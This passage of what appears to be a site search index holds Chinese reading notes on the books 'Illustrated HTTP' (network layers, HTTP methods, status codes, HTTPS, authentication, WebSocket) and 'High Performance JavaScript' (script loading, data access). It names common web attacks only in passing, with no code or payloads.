\u534f\u8bae\u6709\u505a\u533a\u5206\uff09\uff0c\u518d\u5f80\u4e0b\u662f\u7f51\u7edc\u5c42\uff0c\u4f20\u8f93\u5c42\u5efa\u7acb\u8fde\u63a5\u4e4b\u540e\uff0c\u7f51\u7edc\u5c42\u8d1f\u8d23\u5c06\u6570\u636e\u5305\u7684\u4f20\u8f93\uff08\u6570\u636e\u5305\u662f\u7f51\u7edc\u4f20\u8f93\u7684\u6700\u5c0f\u5355\u4f4d\uff09\u3002\u6700\u540e\u662f\u94fe\u8def\u5c42\uff0c\u7528\u6765\u8fde\u63a5\u7f51\u7edc\u914d\u4ef6\u7684\u90e8\u5206\uff0c\u4e3e\u4e2a\u6817\u5b50\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u7f51\u5361\u554a\uff0c\u5149\u7ea4\u554a\u3002\u5728\u4e00\u4e2a\u5b8c\u6574\u7684\u6570\u636e\u4f20\u8f93\u4e2d\uff0c\u5ba2\u6237\u7aef\u4f1a\u6309\u7167\u5e94\u7528\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u7f51\u7edc\u5c42\uff0c\u94fe\u8def\u5c42\u7684\u987a\u5e8f\u8fdb\u884c\u8fdb\u884c\u5904\u7406\uff0c\u6bcf\u4e00\u5c42\u90fd\u4f1a\u52a0\u4e00\u4e2a\u9996\u90e8\uff0c\u670d\u52a1\u5668\u7aef\u5728\u63a5\u6536\u7684\u65f6\u5019\u6309\u7167\u94fe\u8def\u5c42\uff0c\u7f51\u8def\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u5e94\u7528\u5c42\u7684\u987a\u5e8f\u53bb\u79fb\u9664\u9996\u90e8\u3002 \u6211\u4eec\u5e38\u8bf4\u76843\u6b21\u63e1\u624b\u5c31\u662f TCP \u534f\u8bae\u91c7\u7528\u7684\u7b56\u7565\uff0c\u4e3a\u4e86\u4f20\u8f93\u65b9\u4fbf\uff0cTCP \u5c06\u5927\u6570\u636e\u5206\u5272\u6210\u4ee5\u62a5\u6587\u4e3a\u5355\u4f4d\u7684\u6570\u636e\u5305\uff0cIP \u534f\u8bae\u8d1f\u8d23\u628a\u6570\u636e\u5305\u53d1\u9001\u51fa\u53bb\u3002\u5728\u53d1\u9001\u7684\u8fc7\u7a0b\u4e2d\u5e38\u5e38\u9700\u8981\u7ecf\u8fc7\u591a\u4e2a\u8def\u7531\u5668\u7684\u4e2d\u8f6c\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f1a\u8fd0\u7528 ARP \u534f\u8bae\u6765\u67e5\u627e\u4e0b\u4e00\u4e2a\u8def\u7531\u5668\u7684\u5730\u5740\u3002 \u901a\u5e38\u7528\u6237\u7684\u4e60\u60ef\u4f1a\u53bb\u8bbf\u95ee\u57df\u540d\u800c\u4e0d\u662fIP\u5730\u5740\uff0c\u5c06\u57df\u540d\u89e3\u6790\u6210\u5bf9\u5e94\u7684 IP \u5c31\u9700\u8981\u7528\u5230 DNS \u534f\u8bae\u57df\u540d\u89e3\u6790\u7684\u670d\u52a1\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#http_1","title":"\u7b80\u5355\u7684 HTTP \u534f\u8bae","text":"<p>\u65e5\u5e38\u5f00\u53d1\u4e2d\u6211\u4eec\u611f\u77e5\u4e0d\u5230 http \u534f\u8bae\u7684\u5e95\u5c42\u5b9e\u73b0\uff0c\u6211\u4eec\u6240\u4e86\u89e3\u7684 HTTP \u534f\u8bae\u603b\u662f\u7531\u5ba2\u6237\u7aef\u53d1\u8d77\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u3002\u6211\u4eec\u5173\u6ce8\u5230\u7684\u8bf7\u6c42\uff0c\u5e38\u5e38\u662f\u8bf7\u6c42\u7684URI\uff0c\u534f\u8bae\u7248\u672c\uff0c\u5934\u90e8\u4fe1\u606f\uff0c\u53ca\u5185\u5bb9\u5b9e\u4f53\uff0c\u6211\u4eec\u5e38\u4f7f\u7528\u7684\u54cd\u5e94\u4fe1\u606f\u5219\u5305\u62ec\u4e86\u54cd\u5e94\u72b6\u6001\uff0c\u54cd\u5e94\u5185\u5bb9\u3002 \u6211\u4eec\u5e38\u5e38\u4f1a\u4f7f\u7528\u4e0d\u901a\u7684 http \u65b9\u6cd5\u6765\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\u3002\u6211\u4eec\u5e38\u4f7f\u7528 GET \u6765\u83b7\u53d6\u8d44\u6e90\uff0c\u4f7f\u7528 POST \u4f20\u8f93\u5b9e\u4f53\u4e3b\u9898\uff0c\u4f7f\u7528 PUT \u4f20\u8f93\u6587\u4ef6\uff0c\u4f7f\u7528 DELETE \u5220\u9664\u6587\u4ef6\uff0c\u4f7f\u7528 OPTIONS \u8be2\u95ee\u652f\u6301\u7684\u65b9\u6cd5\uff08\u5e38\u5e38\u5728\u8de8\u57df\u7684\u573a\u666f\u4e2d\u4f7f\u7528\uff09\uff0c\u4f7f\u7528TRACE \u83b7\u53d6\u8bbf\u95ee\u8def\u5f84\uff0c\u4f7f\u7528 CONNECT \u7528\u96a7\u9053\u534f\u8bae\u94fe\u63a5\u4ee3\u7406\u3002 http \u534f\u8bae\u662f\u4e00\u79cd\u65e0\u72b6\u6001\u534f\u8bae\uff0c\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u4e0a\u4e00\u6b21\u8bbf\u95ee\u72b6\u6001\uff0c\u8fd9\u4f7f\u5f97\u5f53\u6211\u4eec\u8981\u505a\u7c7b\u4f3c\u4e8e\u767b\u5f55\u8fd9\u6837\u7684\u516c\u80fd\u7684\u65f6\u5019\uff0c\u9700\u8981\u901a\u8fc7 cookie \u6765\u8fdb\u884c\u72b6\u6001\u7684\u7ba1\u7406\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#http-http","title":"HTTP \u62a5\u6587\u5185\u7684 HTTP \u4fe1\u606f","text":"<p>\u901a\u5e38HTTP\u62a5\u6587\uff08\u7528\u4e8eHTTP\u534f\u8bae\u4ea4\u4e92\u7684\u4fe1\u606f\uff09\u7684\u7ed3\u6784\u5305\u62ec\uff0c\u8bf7\u6c42\u884c\uff0c\u72b6\u6001\u884c\uff0c\u9996\u90e8\u5b57\u6bb5\u7b49\uff0c\u4ece HTTP \u7684\u62a5\u6587\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u5f88\u591a\u4fe1\u606f\u3002\u5728 MIME \u6269\u5c55\u4e2d\u4f1a\u4f7f\u7528\u4e00\u79cd\u79f0\u4e3a\u591a\u90e8\u5206\u5bf9\u8c61\u96c6\u5408\u7684\u65b9\u6cd5\uff0c\u6765\u5bb9\u7eb3\u591a\u4efd\u4e0d\u540c\u7684\u6570\u636e\u7c7b\u578b\uff0c \u5728 HTTP \u62a5\u6587\u4e2d\u4f7f\u7528\u591a\u90e8\u5206\u5bf9\u8c61\u65f6\uff0c\u9700\u8981\u5728\u9996\u90e8\u5b57\u6bb5\u4e0a\u52a0\u4e0a Content-type \u3002 \u901a\u8fc7\u8bbe\u7f6e\u9996\u90e8\u5b57\u6bb5\uff0c\u6765\u8fbe\u5230\u83b7\u53d6\u90e8\u5206\u5185\u5bb9\u8303\u56f4\u8bf7\u6c42\uff08\u8bf7\u6c42\u8d44\u6e90\u4e2d\u65ad\u540e\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u5f00\u59cb\u8bf7\u6c42),\u5c06\u4f20\u8f93\u5185\u5bb9\u7f16\u7801\u7684\u76ee\u7684\uff0c\u6765\u63d0\u9ad8\u52a0\u8f7d\u6548\u7387\u3002 \u6709\u7684\u65f6\u5019\u4e0d\u540c\u7684\u573a\u666f\u9700\u8981\u6211\u4eec\u83b7\u53d6\u4e0d\u540c\u7684\u5185\u5bb9\uff0c\u5c31\u6bd4\u5982\u9875\u9762\u7684\u4e2d\u82f1\u6587\u5207\u6362\u7684\u529f\u80fd\uff0c\u5728HTTP\u8bf7\u6c42\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e accept \u7c7b\u7684\u8bf7\u6c42\u5934\u5b57\u6bb5\u5b9e\u73b0\uff0c\u4e5f\u5c31\u662f\u5185\u5bb9\u534f\u5546\u7684\u65b9\u5f0f\uff0c\u8fd4\u56de\u6700\u5408\u9002\u7684\u5185\u5bb9\u3002\u534f\u5546\u65b9\u5f0f\u5206\u4e3a\uff0c\u670d\u52a1\u5668\u9a71\u52a8\u534f\u5546\uff0c\u5ba2\u6237\u7aef\u9a71\u52a8\u534f\u5546\uff0c\u900f\u660e\u534f\u5546\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#http_2","title":"\u8fd4\u56de\u7ed3\u679c\u7684 HTTP \u72b6\u6001","text":"<p>\u5728HTTP\u901a\u8baf\u4e2d\uff0c\u901a\u8fc7\u8f6c\u6001\u7801\uff0c\u544a\u77e5\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u72b6\u6001\u3002\u72b6\u6001\u7801\u5927\u81f4\u53ef\u4ee5\u88ab\u5206\u4e3a 5 \u5927\u7c7b\uff0c1xx \u8868\u793a\u63a5\u53d7\u7684\u8bf7\u6c42\u6b63\u5728\u5904\u7406\uff0c2xx \u8868\u793a\u8bf7\u6c42\u6b63\u5e38\u5904\u7406\u5b8c\u6bd5\uff0c3xx \u8868\u793a\u9700\u8981\u8fdb\u884c\u9644\u52a0\u64cd\u4f5c\u4ee5\u5b8c\u6210\u8bf7\u6c42\uff0c4xx \u8868\u793a\u5ba2\u6237\u7aef\u65e0\u6cd5\u5904\u7406\u8bf7\u6c42\uff0c5xx \u8868\u793a\u670d\u52a1\u5668\u5904\u7406\u51fa\u9519\u3002</p> <p>\u5728\u8fd95\u5927\u7c7b\u8bf7\u6c42\u4e2d\uff0c\u6211\u4eec\u5e38\u7528\u7684\u5341\u51e0\u79cd\u72b6\u6001\u7801\uff0c\u9700\u8981\u6211\u4eec\u91cd\u70b9\u53bb\u638c\u63e1\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u770b \u7684\u601d\u7ef4\u5bfc\u56fe\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#http-web","title":"\u4e0e HTTP \u534f\u4f5c\u7684 Web \u670d\u52a1\u5668","text":"<p>\u901a\u8fc7\u4f7f\u7528\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5355\u53f0\u4e3b\u673a\u591a\u4e2a\u57df\u540d\u7684\u7ad9\u70b9\u90e8\u7f72\u3002\u5728\u5b9e\u9645\u901a\u8baf\u4e2d\uff0c\u6211\u4eec\u5e38\u5e38\u4f7f\u7528\uff0c\u4ee3\u7406\uff0c\u7f51\u5173\uff0c\u96a7\u9053\u534f\u52a9\u8bf7\u6c42\u8f6c\u53d1\uff0c\u5b89\u5168\u901a\u4fe1\u3002 \u4e3a\u4e86\u63d0\u9ad8\u7f51\u7ad9\u6027\u80fd\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u7f13\u5b58\u65b9\u5f0f\u6765\u63d0\u9ad8\u7ad9\u70b9\u8bf7\u6c42\u901f\u7387\uff0c\u901a\u5e38\u662f\u901a\u8fc7\u8bbe\u7f6e\u4ee3\u7406\u670d\u52a1\u5668\u7f13\u5b58\u548c\u5ba2\u6237\u7aef\u7f13\u5b58\u6765\u5b9e\u73b0\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7f13\u5b58\u90fd\u4f1a\u8bbe\u7f6e\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff0c\u7ad9\u70b9\u5185\u5bb9\u66f4\u65b0\u65f6\uff0c\u7f13\u5b58\u5185\u5bb9\u4e5f\u9700\u8981\u53ca\u65f6\u66f4\u65b0\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#http_3","title":"HTTP \u5934\u90e8","text":"<p>\u5728\u8bf7\u6c42\u4e2d\uff0cHTTP \u62a5\u6587\u7531\u8bf7\u6c42\u65b9\u6cd5\uff0cURI\uff0cHTTP\u7248\u672c\uff0cHTTP \u9996\u90e8\u5b57\u6bb5\u7b49\u90e8\u5206\u6784\u6210\u3002\u5728\u54cd\u5e94\u4e2d\uff0cHTTP \u7684\u62a5\u6587\u6709 HTTP \u7248\u672c\uff0c\u72b6\u6001\u7801\uff0cHTTP\u9996\u90e8\u5b57\u6bb53\u90e8\u5206\u6784\u6210\u3002\u9996\u90e8\u4fe1\u606f\u5c24\u4e3a\u91cd\u8981\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u9996\u90e8\u5b57\u6bb5\u7684\u8bbe\u7f6e\u6765\u4f20\u9012\u8bf7\u6c42\u4fe1\u606f\uff0c\u7c7b\u6bd4\u4e8e\u7f13\u5b58\u63a7\u5236\uff0c\u62a5\u6587\u521b\u5efa\u65f6\u95f4\uff0c\u662f\u5426\u538b\u7f29\u7f16\u7801\uff0c\u662f\u5426\u652f\u6301\u8de8\u57df\u7b49\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#web-https","title":"\u786e\u4fdd Web \u5b89\u5168\u7684 HTTPS","text":"<p>HTTP \u7b80\u5355\u7075\u6d3b\u7684\u8bbe\u7f6e\u4e5f\u9020\u5c31\u4e86\u4ed6\u7684\u7f3a\u70b9\u30021. \u901a\u4fe1\u4f7f\u7528\u660e\u6587\uff0c\u5185\u5bb9\u53ef\u80fd\u88ab\u7a83\u542c\u30022\u3001\u4e0d\u9a8c\u8bc1\u901a\u8baf\u65b9\u7701\u4efd\uff0c\u56e0\u6b64\u6709\u53ef\u80fd\u4f1a\u906d\u9047\u4f2a\u88c5\u30023\u3001\u65e0\u6cd5\u8bc1\u660e\u62a5\u6587\u7684\u5b8c\u6574\u6027\uff0c\u6240\u6709\u6709\u53ef\u80fd\u88ab\u7be1\u6539\u3002HTTPS \u5176\u5b9e\u4e5f\u4e0d\u7b97\u662f\u4e00\u4e2a\u5168\u65b0\u7684\u534f\u8bae\uff0cHTTPS = HTTP + \u52a0\u5bc6 + \u8ba4\u8bc1 + \u5b8c\u6574\u6027\u4fdd\u62a4\u3002HTTPS \u5b8c\u5584\u4e86 HTTP \u7684\u76f8\u5173\u7f3a\u70b9\uff0c\u5728 HTTP \u7684\u90e8\u5206\u901a\u4fe1\u63a5\u53e3\u91c7\u7528 SSL \u548c TLS \u534f\u8bae\u66ff\u4ee3\uff0c\u4f7f\u7528\u4e86\u6570\u5b57\u8bc1\u4e66\u8ba4\u8bc1\u673a\u6784\u548c\u5176\u4ed6\u76f8\u5173\u673a\u5173\u9881\u53d1\u7684\u516c\u5f00\u79d8\u94a5\u8bc1\u4e66 \u4f55\u4e3a\u8ba4\u8bc1</p> <p>HTTP \u7684\u8ba4\u8bc1\u65b9\u5f0f\u901a\u5e38\u662f BASIC\u8ba4\u8bc1\uff08\u57fa\u672c\u8ba4\u8bc1\uff09\uff0cDIGEST\u8ba4\u8bc1\uff08\u6458\u8981\u8ba4\u8bc1\uff09\uff0cSSL \u5ba2\u6237\u7aef\u8ba4\u8bc1\uff0cFormBase \u8ba4\u8bc1\uff08\u57fa\u4e8e\u8868\u5355\u8ba4\u8bc1\uff09\u3002BASIC \u8ba4\u8bc1\u548c DIGEST \u8ba4\u8bc1\u901a\u8fc7\u9996\u90e8\u5b57\u6bb5 Authorization \u786e\u8ba4\u8ba4\u8bc1\u4fe1\u606f\uff0cSSL \u501f\u7531 HTTPS \u5ba2\u6237\u7aef\u8bc1\u4e66\u5b8c\u6210\u8ba4\u8bc1\u65b9\u5f0f\u3002 \u8868\u5355\u8ba4\u8bc1\u5219\u662f\u4f9d\u8d56\u4e8e cookie \u4fdd\u5b58\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#http_4","title":"\u57fa\u4e8e HTTP \u7684\u529f\u80fd\u8ffd\u52a0\u534f\u8bae","text":"<p>SPDY \u5728TCP/IP \u7684\u5e94\u7528\u5c42\u4e0e\u8fd0\u8f93\u5c42\u4e4b\u95f4\u901a\u8fc7\u65b0\u52a0\u4f1a\u8bdd\u5c42\u7684\u5f62\u5f0f\u8fd0\u4f5c\uff0c\u4f7f\u7528 SPDY \u4f7f\u5f97 HTTP \u534f\u8bae\u7684\u529f\u80fd\u5f97\u5230\u4e86\u6269\u5c55\uff0c\u5b9e\u73b0\u4e86\u591a\u8def\u590d\u7528\u6d41\uff0c\u8d4b\u4e88\u8bf7\u6c42\u4f18\u5148\u7ea7\uff0c\u538b\u7f29 HTTP \u9996\u90e8\uff0c\u63a8\u9001\u529f\u80fd\uff0c\u670d\u52a1\u5668\u63d0\u9192\u529f\u80fd\u3002 \u4f7f\u7528 WebSocket \u8fdb\u884c\u5168\u53cc\u5de5\u901a\u4fe1\uff0c\u53ea\u8981\u5efa\u7acb\u4e86\u94fe\u63a5\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u90fd\u80fd\u90fd\u4e3b\u52a8\u5f97\u5411\u5bf9\u65b9\u53d1\u9001\u4fe1\u606f\u3002\u548c HTTP \u76f8\u6bd4\uff0c\u51cf\u5c11\u4e86\u6bcf\u6b21\u5efa\u7acb\u8fde\u63a5\u7684\u5f00\u9500\uff0c\u51cf\u5c11\u4e86\u901a\u4fe1\u9996\u90e8\u4fe1\u606f\u3002 HTTP/2.0 \u6539\u5584\u4e86\u4f7f\u7528 web \u65f6\u7684\u901f\u5ea6\u4f53\u9a8c\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/#web","title":"\u6784\u5efa Web \u5185\u5bb9\u7684\u6280\u672f","text":"<p>web \u5e94\u7528\u5f00\u53d1\u8bed\u8a00\u7684\u4e09\u5251\u5ba2\uff0cHTML\uff0cCSS\uff0cjavascript \u3002\u4e66\u51fa\u7248\u7684\u6709\u70b9\u4e45\u6240\u4ee5\u4e66\u4e2d\u6ca1\u6709\u63d0\u5230\uff0c\u73b0\u5728\u706b\u7206\u7684 web \u6784\u5efa\u6280\u672f\uff0cVue\uff0cReact \u7b49\u6d41\u884c\u524d\u7aef\u6846\u67b6\u3002XML\uff0cJSON \u6570\u636e\u53d1\u5e03\u8bed\u8a00\uff0c\u5176\u4e2d JSON \u6bd4\u8f83\u5e38\u7528\uff0c\u65e5\u5e38\u5f00\u53d1\u90fd\u79bb\u4e0d\u4e86\u4ed6\u3002 web \u7684\u653b\u51fb\u6280\u672f</p> <p>\u5728 Web \u5e94\u7528\u4e2d\uff0c\u4ece\u6d4f\u89c8\u5668\u90a3\u63a5\u6536\u5230\u7684 HTTP \u8bf7\u6c42\u7684\u5168\u90e8\u5185\u5bb9\uff0c\u90fd\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u7531\u7684\u53d8\u66f4\u3001\u7be1\u6539\uff0c\u5728HTTP\u8bf7\u6c42\u62a5\u6587\u4e2d\u52a0\u8f7d\u653b\u51fb\u4ee3\u7801\uff0c\u5c31\u80fd\u53d1\u8d77\u5bf9 Web \u5e94\u7528\u7684\u653b\u51fb\u3002Web \u5e94\u7528\u7684\u653b\u51fb\u6a21\u5f0f\u4e3b\u8981\u662f\u4e3b\u52a8\u653b\u51fb\u548c\u88ab\u52a8\u653b\u51fb\u3002</p> <p>\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u5f0f\u6709\uff0c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0cSQL \u6ce8\u5165\u653b\u51fb\uff0cHTTP \u9996\u90e8\u6ce8\u5165\u653b\u51fb\u3002\u8fd9\u4e9b\u653b\u51fb\u9020\u6210\u7684\u5f71\u54cd\u89c1 \u601d\u7ef4\u5bfc\u56fe\u3002\u901a\u5e38\u7b80\u5355\u7684 HTTP \u534f\u8bae\u672c\u8eab\u4e0d\u4f1a\u5b58\u5728\u5b89\u5168\u6027\u7684\u95ee\u9898\uff0c\u534f\u8bae\u672c\u8eab\u4e5f\u4e0d\u4f1a\u6210\u4e3a\u653b\u51fb\u5bf9\u8c61\uff0c\u9ed1\u5ba2\u5229\u7528\u7684\u5e38\u5e38\u662f\u56e0\u4e3a\u8bbe\u8ba1\u548c\u8bbe\u7f6e\u4e0a\u7684\u7f3a\u9677\uff0c\u4f1a\u8bdd\u7ba1\u7406\u758f\u5ffd\u7b49\u5f15\u53d1\u7684\u5b89\u5168\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E9%AB%98%E6%80%A7%E8%83%BDJS/","title":"\u7cbe\u8bfb\u300a\u9ad8\u6027\u80fdjavascript\u300b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 13355  \u9605\u8bfb27\u5206\u949f</p> <p>\u539f\u4f5c\u8005\uff1a\u767d\u9738\u5929</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E9%AB%98%E6%80%A7%E8%83%BDJS/#_1","title":"\u524d\u8a00","text":"<p>\u672c\u671f\u6211\u6765\u7ed9\u5927\u5bb6\u63a8\u8350\u7684\u4e66\u662f\u300a\u9ad8\u6027\u80fdJavaScript\u300b,\u5728\u8fd9\u672c\u4e66\u4e2d\u6211\u4eec\u80fd\u591f\u4e86\u89e3 javascript \u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7684\u6027\u80fd\u74f6\u9888,\u5982\u4f55\u63d0\u5347\u5404\u65b9\u9762\u7684\u6027\u80fd\uff0c\u5305\u62ec\u4ee3\u7801\u7684\u52a0\u8f7d\u3001\u8fd0\u884c\u3001DOM\u4ea4\u4e92\u3001\u9875\u9762\u751f\u5b58\u5468\u671f\u7b49\u3002\u540c\u6837\u6211\u4eec\u4eca\u5929\u8fd8\u662f\u7528\u601d\u7ef4\u5bfc\u56fe\u7684\u65b9\u5f0f\u6765\u7cbe\u8bfb\u4e00\u904d\u3002\uff08\u601d\u7ef4\u5bfc\u56fe\u56fe\u7247\u53ef\u80fd\u6709\u70b9\u5c0f\uff0c\u8bb0\u5f97\u70b9\u5f00\u770b\uff0c\u4f60\u4f1a\u6709\u6240\u6536\u83b7\uff09</p> <p>\u52a0\u8f7d\u548c\u6267\u884c</p> <p></p> <p>\u7ba1\u7406\u6d4f\u89c8\u5668\u4e2d\u7684 JavaScript \u4ee3\u7801\u662f\u4e2a\u68d8\u624b\u7684\u95ee\u9898,\u56e0\u4e3a\u4ee3\u7801\u6267\u884c\u963b\u585e\u4e86\u5176\u4ed6\u6d4f\u89c8\u5668\u5904\u7406\u8fc7\u7a0b,\u8bf8\u5982\u7528\u6237 \u754c\u9762\u7ed8\u5236\u3002\u6bcf\u6b21\u9047\u5230<code>&lt;script&gt;</code>\u6807\u7b7e,\u9875\u9762\u5fc5\u987b\u505c\u4e0b\u6765\u7b49\u5f85\u4ee3\u7801\u4e0b\u8f7d(\u5982\u679c\u662f\u5916\u90e8\u7684)\u5e76\u6267\u884c,\u7136\u540e\u518d\u7ee7\u7eed\u5904\u7406\u9875\u9762\u5176\u4ed6\u90e8\u5206\u3002\u4f46\u662f,\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u51cf\u5c11 JavaScript \u5bf9\u6027\u80fd\u7684\u5f71\u54cd:</p> <ol> <li> <p>\u5c06\u6240\u6709<code>&lt;script&gt;</code>\u6807\u7b7e\u653e\u7f6e\u5728\u9875\u9762\u7684\u5e95\u90e8,\u7d27\u9760 body \u5173\u95ed\u6807\u7b7e<code>&lt;/body&gt;</code>\u7684\u4e0a\u65b9\u3002\u6b64\u6cd5\u53ef\u4ee5\u4fdd\u8bc1\u9875\u9762\u5728\u811a\u672c \u8fd0\u884c\u4e4b\u524d\u5b8c\u6210\u89e3\u6790\u3002</p> </li> <li> <p>\u5c06\u811a\u672c\u6210\u7ec4\u6253\u5305\u3002\u9875\u9762\u7684<code>&lt;script&gt;</code>\u6807\u7b7e\u8d8a\u5c11,\u9875\u9762\u7684\u52a0\u8f7d\u901f\u5ea6\u5c31\u8d8a\u5feb,\u54cd\u5e94\u4e5f\u66f4\u52a0\u8fc5\u901f\u3002\u4e0d\u8bba\u5916\u90e8\u811a\u672c\u6587\u4ef6\u8fd8\u662f\u5185\u8054\u4ee3\u7801\u90fd\u662f\u5982\u6b64\u3002</p> </li> </ol> <p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528\u975e\u963b\u585e\u65b9\u5f0f\u4e0b\u8f7d JavaScript:</p> <ul> <li> <p>\u4e3a<code>&lt;script&gt;</code>\u6807\u7b7e\u6dfb\u52a0 defer \u5c5e\u6027(\u53ea\u9002\u7528\u4e8e Internet Explorer \u548c Firefox 3.5 \u4ee5\u4e0a\u7248\u672c)</p> </li> <li> <p>\u52a8\u6001\u521b\u5efa<code>&lt;script&gt;</code>\u5143\u7d20,\u7528\u5b83\u4e0b\u8f7d\u5e76\u6267\u884c\u4ee3\u7801</p> </li> <li> <p>\u7528 XHR \u5bf9\u8c61\u4e0b\u8f7d\u4ee3\u7801,\u5e76\u6ce8\u5165\u5230\u9875\u9762\u4e2d</p> </li> </ul> <p>\u901a\u8fc7\u4f7f\u7528\u4e0a\u8ff0\u7b56\u7565,\u4f60\u53ef\u4ee5\u6781\u5927\u63d0\u9ad8\u90a3\u4e9b\u5927\u91cf\u4f7f\u7528 JavaScript \u4ee3\u7801\u7684\u7f51\u9875\u5e94\u7528\u7684\u5b9e\u9645\u6027\u80fd\u3002</p> <p>\u6570\u636e\u5b58\u53d6</p> <p></p> <p></p> <p>\u5728 JavaScript \u4e2d,\u6570\u636e\u5b58\u50a8\u4f4d\u7f6e\u53ef\u4ee5\u5bf9\u4ee3\u7801\u6574\u4f53\u6027\u80fd\u4ea7\u751f\u91cd\u8981\u5f71\u54cd\u3002\u6709\u56db\u79cd\u6570\u636e\u8bbf\u95ee\u7c7b\u578b:\u76f4\u63a5\u91cf,\u53d8\u91cf,\u6570\u7ec4\u9879,\u5bf9\u8c61\u6210\u5458\u3002\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u6027\u80fd\u8003\u8651\u3002</p> <ul> <li>\u76f4\u63a5\u91cf\u548c\u5c40\u90e8\u53d8\u91cf\u8bbf\u95ee\u901f\u5ea6\u975e\u5e38\u5feb,\u6570\u7ec4\u9879\u548c\u5bf9\u8c61\u6210\u5458\u9700\u8981\u66f4\u957f\u65f6\u95f4\u3002</li> <li>\u5c40\u90e8\u53d8\u91cf\u6bd4\u57df\u5916\u53d8\u91cf\u5feb,\u56e0\u4e3a\u5b83\u4f4d\u4e8e\u4f5c\u7528\u57df\u94fe\u7684\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u4e2d\u3002</li> <li>\u53d8\u91cf\u5728\u4f5c\u7528\u57df\u94fe\u4e2d\u7684\u4f4d\u7f6e\u8d8a\u6df1,\u8bbf\u95ee\u6240\u9700\u7684\u65f6\u95f4\u5c31\u8d8a\u957f\u3002</li> <li>\u5168\u5c40\u53d8\u91cf\u603b\u662f\u6700\u6162\u7684,\u56e0\u4e3a\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u4f5c\u7528\u57df\u94fe\u7684\u6700\u540e\u4e00\u73af\u3002</li> <li>\u907f\u514d\u4f7f\u7528 with \u8868\u8fbe\u5f0f,\u56e0\u4e3a\u5b83\u6539\u53d8\u4e86\u8fd0\u884c\u671f\u4e0a\u4e0b\u6587\u7684\u4f5c\u7528\u57df\u94fe\u3002</li> <li>\u5e94\u5f53\u5c0f\u5fc3\u5bf9\u5f85 try-catch \u8868\u8fbe\u5f0f\u7684 catch \u5b50\u53e5,\u56e0\u4e3a\u5b83\u5177\u6709\u540c\u6837\u6548\u679c\u3002</li> <li>\u5d4c\u5957\u5bf9\u8c61\u6210\u5458\u4f1a\u9020\u6210\u91cd\u5927\u6027\u80fd\u5f71\u54cd,\u5c3d\u91cf\u5c11\u7528\u3002</li> </ul> <p>\u4e00\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u5728\u539f\u5f62\u94fe\u4e2d\u7684\u4f4d\u7f6e\u8d8a\u6df1,\u8bbf\u95ee\u5b83\u7684\u901f\u5ea6\u5c31\u8d8a\u6162\u3002\u901a\u5e38,\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u63d0\u9ad8 JavaScript \u4ee3\u7801\u7684\u6027\u80fd: \u5c06\u7ecf\u5e38\u4f7f\u7528\u7684\u5bf9\u8c61\u6210\u5458,\u6570\u7ec4\u9879,\u548c\u57df\u5916\u53d8\u91cf\u5b58\u5165\u5c40\u90e8\u53d8\u91cf\u4e2d\u3002\u7136\u540e,\u8bbf\u95ee\u5c40\u90e8\u53d8\u91cf\u7684\u901f\u5ea6\u4f1a\u5feb\u4e8e\u90a3\u4e9b\u539f\u59cb\u53d8\u91cf\u3002\u901a\u8fc7\u4f7f\u7528\u8fd9\u4e9b\u7b56\u7565,\u4f60\u53ef\u4ee5\u6781\u5927\u5730\u63d0\u9ad8\u90a3\u4e9b\u9700\u8981\u5927\u91cf JavaScript \u4ee3\u7801\u7684\u7f51\u9875\u5e94\u7528\u7684\u5b9e\u9645\u6027\u80fd\u3002</p> <p>DOM \u7f16\u7a0b</p> <p></p> <p></p> <p></p> <p>DOM 